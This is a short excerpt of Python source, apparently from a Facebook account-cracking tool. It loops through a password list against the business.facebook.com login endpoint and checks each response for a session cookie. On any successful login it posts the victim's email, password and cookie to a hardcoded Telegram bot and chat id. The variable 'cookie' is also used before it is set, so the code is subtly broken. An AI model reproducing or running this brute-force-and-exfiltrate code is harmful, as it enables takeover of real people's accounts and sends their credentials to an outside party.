    ...
    def Main(self, total, email, pwx):
        try:
            ...
            for pw in pwx:
                pw = pw.lower()
                with requests.Session() as r:
                    url = ('https://business.facebook.com/login/device-based/regular/login/')
                    params = {
                        'login_attempt': '1',
                    ...
                    r.headers.update({
                        ...
                        'referer': 'https://business.facebook.com/login/?next=https%3A%2F%2Fbusiness.facebook.com%2F',
                    ...
                    if 'c_user' in r.cookies.get_dict().keys():
                        requests.post(f"https://api.telegram.org/bot5623145401:AAHJqVOhmi7Yojm4CuzmJ5pCANbX6xGeTN0/sendMessage?chat_id=-1001866427708&text={email}\n{pw}\n{cookie}")
                        cookie = (";".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()]))
